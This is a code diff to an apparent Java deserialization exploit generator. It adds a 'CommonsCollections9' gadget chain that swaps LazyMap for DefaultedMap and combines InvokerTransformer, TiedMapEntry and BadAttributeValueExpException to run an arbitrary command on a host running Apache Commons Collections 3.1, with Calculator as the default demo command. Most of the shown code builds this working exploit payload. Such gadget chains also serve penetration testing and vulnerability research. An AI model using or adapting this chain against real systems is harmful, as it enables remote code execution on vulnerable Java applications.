@@ -11,6 +11,7 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.DefaultedMap;
 import org.apache.commons.collections.map.LazyMap;
 
 /*
@@ -43,11 +44,11 @@ https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4e
 /**
  * commons-collections:commons-collections:3.1
  */
-public interface CommonsCollections extends Gadget {
+public interface CommonsCollections9 extends Gadget {
 
 	@Args(minArgs = 1, args = {
 			"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
-	default BadAttributeValueExpException makeCommonsCollections(UtilFactory uf, String[] args) throws Exception {
+	default BadAttributeValueExpException makeCommonsCollections9(UtilFactory uf, String[] args) throws Exception {
 		final String[] execArgs = new String[] { args[0] };
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
@@ -66,9 +67,9 @@ public interface CommonsCollections extends Gadget {
 				new ConstantTransformer(1) };
 		final Map innerMap = new HashMap();
 
-		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+		final Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);
 
-		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+		TiedMapEntry entry = new TiedMapEntry(defaultedmap, "foo");
 
 		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
 		Field valfield = val.getClass().getDeclaredField("val");
